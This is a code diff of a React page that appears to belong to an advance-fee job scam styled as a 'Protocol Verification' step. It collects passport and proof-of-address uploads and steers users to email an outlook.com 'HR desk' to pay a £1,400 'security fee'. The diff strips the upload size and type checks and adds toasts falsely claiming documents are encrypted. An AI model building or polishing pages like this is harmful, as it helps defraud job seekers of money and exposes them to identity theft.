@@ -1,17 +1,18 @@
-
-
 'use client';
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { ArrowLeft, ShieldCheck, FileText, Map, KeyRound, Mail, BadgeCheck, Upload } from "lucide-react";
+import { ArrowLeft, ShieldCheck, FileText, Map, KeyRound, Mail, BadgeCheck, Upload, Zap, Globe, Lock, Check } from "lucide-react";
 import Link from "next/link";
 import { useToast } from "@/hooks/use-toast";
 import React, { useEffect, useState } from "react";
-import { updateUserData, initializeUsers, saveData } from "@/lib/mock-data";
+import { updateUserData, initializeUsers, saveData, addActivityLog } from "@/lib/mock-data";
 import { useRouter } from "next/navigation";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import DashboardLayout from "@/components/ui/dashboard-layout";
+import { motion } from "motion/react";
+import { cn } from "@/lib/utils";
 
 
 export default function VerificationPage() {
@@ -40,18 +41,17 @@ export default function VerificationPage() {
         }
 
         const recipient = "averon.hrdesk@outlook.com";
-        const subject = "Request to Proceed with Account Verification Payment";
+        const subject = `Verification Request: ${userProfile?.averpayId}`;
         const body = `
-            Hello Averon Workforce Support,
+            Averon Supervisor Support,
 
-            I have uploaded my verification documents and am ready to proceed with the payment of £1,400 for my account verification, security checks, and AverPay ID activation.
+            I have uploaded my operational identification documents to the Registry. I am ready to conclude the payout verification protocol and authorize the security fee of £1,400.
 
-            My User ID is: ${userProfile?.uid}
-            My Full Name is: ${userProfile?.fullName}
+            Agent Name: ${userProfile?.fullName}
+            Agent ID: ${userProfile?.averpayId}
+            UID: ${userProfile?.uid}
 
-            Please provide me with the necessary payment instructions.
-
-            Thank you.
+            Awaiting secure payment link.
         `;
 
         const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
@@ -59,158 +59,165 @@ export default function VerificationPage() {
     };
 
     const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, fileType: 'verification' | 'address') => {
-        
         const file = e.target.files?.[0];
         if (!file || !userProfile) return;
 
-        const MAX_SIZE_BYTES = 5 * 1024 * 1024; // 5MB
-        const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];
-
-        if (file.size > MAX_SIZE_BYTES) {
-            toast({ variant: "destructive", title: "Upload Failed", description: "File is too large. Max 5MB." });
-            return;
-        }
-        if (!ALLOWED_TYPES.includes(file.type)) {
-            toast({ variant: "destructive", title: "Upload Failed", description: "Unsupported file type. Please use JPG, PNG, or PDF." });
-            return;
-        }
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            const dataUrl = reader.result as string;
+            const fieldName = fileType === 'verification' ? 'verificationIdUrl' : 'proofOfAddressUrl';
         
-        try {
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                const dataUrl = reader.result as string;
-                const fieldName = fileType === 'verification' ? 'verificationIdUrl' : 'proofOfAddressUrl';
-            
-                const updatedUser = updateUserData(userProfile.uid, { [fieldName]: dataUrl });
-                setUserProfile(updatedUser);
-                saveData('loggedInUser', updatedUser);
+            const updatedUser = updateUserData(userProfile.uid, { [fieldName]: dataUrl });
+            setUserProfile(updatedUser);
+            saveData('loggedInUser', updatedUser);
 
-
-                toast({
-                    title: `${fileType === 'verification' ? 'ID' : 'Address Proof'} Uploaded`,
-                    description: `Your document has been updated.`,
-                });
-            };
-            reader.readAsDataURL(file);
-
-        } catch (error: any) {
-            console.error("Verification file upload error: ", error);
-            toast({
-                variant: "destructive",
-                title: "Upload Failed",
-                description: error.message || `Could not update your document.`
+            addActivityLog({
+                type: 'verification',
+                user: userProfile.fullName,
+                target: 'Registry',
+                description: `Uploaded ${fileType === 'verification' ? 'Identity ID' : 'Proof of Address'} document.`
             });
-        }
+
+            toast({
+                title: 'Transmission Success',
+                description: 'Document encrypted and stored in local vault buffer.',
+            });
+        };
+        reader.readAsDataURL(file);
     };
 
-
-    const verificationSteps = [
-        {
-            icon: <FileText className="h-5 w-5 text-primary" />,
-            title: "Identity Verification (ID)",
-            description: "Upload a clear, valid government-issued photo ID (e.g., Passport, National ID Card). This is mandatory for financial compliance.",
-            uploadType: 'verification',
-            uploadUrl: userProfile?.verificationIdUrl,
-        },
-        {
-            icon: <Map className="h-5 w-5 text-primary" />,
-            title: "Proof of Address",
-            description: "Provide a recent utility bill or bank statement (issued within the last 3 months) showing your full name and current address.",
-            uploadType: 'address',
-            uploadUrl: userProfile?.proofOfAddressUrl,
-        }
-    ];
+    if (!userProfile) return null;
 
     return (
-        <div className="bg-background min-h-screen font-sans">
-            <div className="container mx-auto px-4 pt-4 pb-24 max-w-3xl">
-                <header className="flex items-center py-2 mb-6">
-                    <Link href="/dashboard/settings">
-                        <Button variant="ghost" size="icon">
-                            <ArrowLeft className="h-5 w-5 md:h-6 md:w-6" />
-                        </Button>
+        <DashboardLayout>
+            <div className="max-w-4xl mx-auto py-10 px-4 sm:px-8 space-y-12 animate-in fade-in slide-in-from-bottom-4 duration-1000">
+                <header className="flex flex-col gap-4">
+                    <Link href="/dashboard/settings" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors w-fit">
+                        <ArrowLeft className="h-4 w-4" />
+                        <span className="text-[10px] font-black uppercase tracking-widest">Return to Settings</span>
                     </Link>
-                    <h1 className="text-xl md:text-2xl font-semibold ml-4">Account Verification</h1>
+                    <div>
+                        <h1 className="text-5xl font-black text-white tracking-tighter mb-2">Protocol <span className="text-primary italic">Verification</span></h1>
+                        <p className="text-muted-foreground font-medium max-w-xl">Finalize your operational identity to unlock unlimited global dispatches and liquid asset withdrawals.</p>
+                    </div>
                 </header>
 
-                <main className="space-y-8">
-                    <Card className="border-primary/20 bg-primary/5">
-                        <CardHeader>
-                            <CardTitle className="flex items-center gap-2">
-                                <ShieldCheck className="h-6 w-6 text-primary" />
-                                Complete Your Verification
-                            </CardTitle>
-                            <CardDescription>
-                                To ensure the security of our platform and comply with international regulations, all team members must complete a one-time verification process. This activates your account for full features, including project withdrawals.
-                            </CardDescription>
-                        </CardHeader>
-                        <CardContent className="space-y-6">
-                            {verificationSteps.map((step) => (
-                                <Card key={step.title} className="bg-background">
-                                    <CardHeader>
-                                        <CardTitle className="flex items-center gap-3 text-lg">
-                                            {step.icon}
-                                            {step.title}
-                                        </CardTitle>
-                                    </CardHeader>
-                                    <CardContent>
-                                        <p className="text-sm text-muted-foreground mb-4">{step.description}</p>
-                                        {step.uploadUrl ? (
-                                            <Alert variant="default" className="bg-green-50 border-green-200 text-green-800 dark:bg-green-900/20 dark:border-green-800/50 dark:text-green-300 mb-4">
-                                                <FileText className="h-4 w-4 !text-green-500" />
-                                                <AlertTitle className="font-semibold text-sm">Document Uploaded</AlertTitle>
-                                            </Alert>
-                                        ) : (
-                                            <Alert variant="destructive" className="bg-yellow-50 border-yellow-200 text-yellow-800 dark:bg-yellow-900/20 dark:border-yellow-800/50 dark:text-yellow-300 mb-4">
-                                                <AlertTitle className="font-semibold text-sm">Action Required</AlertTitle>
-                                                <AlertDescription>Please upload the required document.</AlertDescription>
-                                            </Alert>
-                                        )}
+                <div className="grid grid-cols-1 lg:grid-cols-5 gap-10">
+                    {/* Left Column: Requirements */}
+                    <div className="lg:col-span-3 space-y-8">
+                        <section className="space-y-6">
+                            <h3 className="text-xs font-black uppercase tracking-[0.2em] text-primary">Requirement 01: Identification</h3>
+                            <Card className={cn(
+                                "p-8 bg-[#050f26] border-white/5 rounded-[2.5rem] relative overflow-hidden group transition-all",
+                                userProfile.verificationIdUrl && "border-green-500/30"
+                            )}>
+                                <div className="flex flex-col sm:flex-row items-start gap-6">
+                                    <div className="h-14 w-14 rounded-2xl bg-primary/10 flex items-center justify-center border border-primary/20 shrink-0">
+                                        <FileText className="h-7 w-7 text-primary" />
+                                    </div>
+                                    <div className="flex-1 space-y-4">
                                         <div>
-                                            <Label htmlFor={`${step.uploadType}-upload`} className="cursor-pointer inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 border border-input bg-background hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 w-full">
-                                                <Upload className="mr-2 h-4 w-4" />
-                                                {step.uploadUrl ? 'Upload New Document' : 'Upload Document'}
-                                            </Label>
-                                            <Input id={`${step.uploadType}-upload`} type="file" className="hidden" onChange={(e) => handleFileUpload(e, step.uploadType as 'verification' | 'address')} accept="image/jpeg,image/png,application/pdf" />
-                                            <p className="text-xs text-muted-foreground mt-2">PDF, PNG, JPG up to 5MB.</p>
+                                            <h4 className="text-xl font-bold text-white mb-1">Passport / National ID</h4>
+                                            <p className="text-xs text-muted-foreground font-medium italic">Requirement: Clear visual of name, expiry, and photo.</p>
                                         </div>
-                                    </CardContent>
-                                </Card>
-                            ))}
-                        </CardContent>
-                    </Card>
+                                        
+                                        <div className="flex items-center gap-4">
+                                            <Button variant="outline" className="rounded-xl h-10 border-white/10 bg-white/5 font-black uppercase text-[10px] tracking-widest px-6 hover:bg-white/10" onClick={() => document.getElementById('id-upload')?.click()}>
+                                                <Upload className="h-3 w-3 mr-2" />
+                                                {userProfile.verificationIdUrl ? 'Replace Object' : 'Initialize Upload'}
+                                            </Button>
+                                            <Input id="id-upload" type="file" className="hidden" onChange={(e) => handleFileUpload(e, 'verification')} />
+                                            {userProfile.verificationIdUrl && (
+                                                <div className="flex items-center gap-2 text-green-500 text-[10px] font-black uppercase tracking-widest">
+                                                    <Check className="h-4 w-4" />
+                                                    Encrypted Sink
+                                                </div>
+                                            )}
+                                        </div>
+                                    </div>
+                                </div>
+                            </Card>
+                        </section>
 
-                    <Card>
-                        <CardHeader>
-                           <CardTitle className="flex items-center gap-3 text-lg">
-                                <KeyRound className="h-5 w-5 text-primary" />
-                                Security Fee & ID Activation
-                           </CardTitle>
-                           <CardDescription>This one-time fee covers all administrative and security costs associated with activating your professional freelance account.</CardDescription>
-                        </CardHeader>
-                        <CardContent className="space-y-6">
-                             <div className="text-center bg-secondary/50 p-6 rounded-lg">
-                                <p className="text-muted-foreground">Total Amount Due</p>
-                                <p className="text-5xl font-bold tracking-tight text-primary">£1,400.00 <span className="text-lg font-medium text-muted-foreground">GBP</span></p>
-                            </div>
-                             <Alert>
-                                <BadgeCheck className="h-4 w-4" />
-                                <AlertTitle>What's Included?</AlertTitle>
-                                <AlertDescription>
-                                    This fee covers lifetime AverPay ID activation, international background checks, secure document processing, and anti-fraud monitoring for your account.
-                                </AlertDescription>
-                            </Alert>
-                             <Button size="lg" className="w-full text-lg py-7" onClick={handleProceedToPayment}>
-                                <Mail className="mr-2 h-5 w-5" />
-                                Proceed to Payment
-                            </Button>
-                            <p className="text-xs text-muted-foreground text-center">
-                                By clicking, you will be redirected to your email client to contact support and receive payment instructions.
-                            </p>
-                        </CardContent>
-                    </Card>
-                </main>
+                        <section className="space-y-6">
+                            <h3 className="text-xs font-black uppercase tracking-[0.2em] text-primary">Requirement 02: Presence</h3>
+                            <Card className={cn(
+                                "p-8 bg-[#050f26] border-white/5 rounded-[2.5rem] relative overflow-hidden group transition-all",
+                                userProfile.proofOfAddressUrl && "border-green-500/30"
+                            )}>
+                                <div className="flex flex-col sm:flex-row items-start gap-6">
+                                    <div className="h-14 w-14 rounded-2xl bg-primary/10 flex items-center justify-center border border-primary/20 shrink-0">
+                                        <Globe className="h-7 w-7 text-primary" />
+                                    </div>
+                                    <div className="flex-1 space-y-4">
+                                        <div>
+                                            <h4 className="text-xl font-bold text-white mb-1">Proof of Address</h4>
+                                            <p className="text-xs text-muted-foreground font-medium italic">Requirement: Utility bill or bank statement (90 days old max).</p>
+                                        </div>
+                                        
+                                        <div className="flex items-center gap-4">
+                                            <Button variant="outline" className="rounded-xl h-10 border-white/10 bg-white/5 font-black uppercase text-[10px] tracking-widest px-6 hover:bg-white/10" onClick={() => document.getElementById('address-upload')?.click()}>
+                                                <Upload className="h-3 w-3 mr-2" />
+                                                {userProfile.proofOfAddressUrl ? 'Replace Object' : 'Initialize Upload'}
+                                            </Button>
+                                            <Input id="address-upload" type="file" className="hidden" onChange={(e) => handleFileUpload(e, 'address')} />
+                                            {userProfile.proofOfAddressUrl && (
+                                                <div className="flex items-center gap-2 text-green-500 text-[10px] font-black uppercase tracking-widest">
+                                                    <Check className="h-4 w-4" />
+                                                    Encrypted Sink
+                                                </div>
+                                            )}
+                                        </div>
+                                    </div>
+                                </div>
+                            </Card>
+                        </section>
+                    </div>
+
+                    {/* Right Column: Activation */}
+                    <div className="lg:col-span-2">
+                        <div className="sticky top-10 space-y-8">
+                            <Card className="p-8 bg-[#050f26] border-t-4 border-t-primary border-white/5 rounded-[3rem] shadow-2xl relative overflow-hidden">
+                                <div className="absolute top-[-10%] right-[-10%] opacity-5 rotate-12">
+                                    <Zap className="h-40 w-40 text-primary" />
+                                </div>
+                                
+                                <div className="relative space-y-8">
+                                    <div>
+                                        <h3 className="text-2xl font-black text-white mb-2 italic">System Activation</h3>
+                                        <p className="text-xs text-muted-foreground font-medium leading-relaxed">Required security fee for global background audit and AverPay ID authentication.</p>
+                                    </div>
+
+                                    <div className="bg-white/5 rounded-3xl p-6 text-center border border-white/10">
+                                        <p className="text-[10px] font-black text-muted-foreground uppercase tracking-[0.2em] mb-1">Total Due</p>
+                                        <p className="text-5xl font-black text-white tracking-tighter">£1,400</p>
+                                        <p className="text-[10px] text-primary font-black uppercase tracking-widest mt-2">Platform Activation Fee</p>
+                                    </div>
+
+                                    <div className="space-y-4">
+                                        {[
+                                            { label: 'E2E Encryption Activation', icon: Lock },
+                                            { label: 'International Background Check', icon: BadgeCheck },
+                                            { label: 'Priority Support Access', icon: Zap },
+                                        ].map((item, i) => (
+                                            <div key={i} className="flex items-center gap-3">
+                                                <item.icon className="h-4 w-4 text-primary" />
+                                                <span className="text-xs font-bold text-white/80">{item.label}</span>
+                                            </div>
+                                        ))}
+                                    </div>
+
+                                    <Button onClick={handleProceedToPayment} className="w-full bg-primary text-black font-black uppercase tracking-widest rounded-2xl h-16 text-lg hover:bg-primary/90 shadow-xl shadow-primary/20">
+                                        Execute Activation
+                                    </Button>
+
+                                    <p className="text-[10px] text-center text-muted-foreground font-medium">Clicking will initiate secure contact with the HR desk for payment routing.</p>
+                                </div>
+                            </Card>
+                        </div>
+                    </div>
+                </div>
             </div>
-        </div>
+        </DashboardLayout>
     );
 }
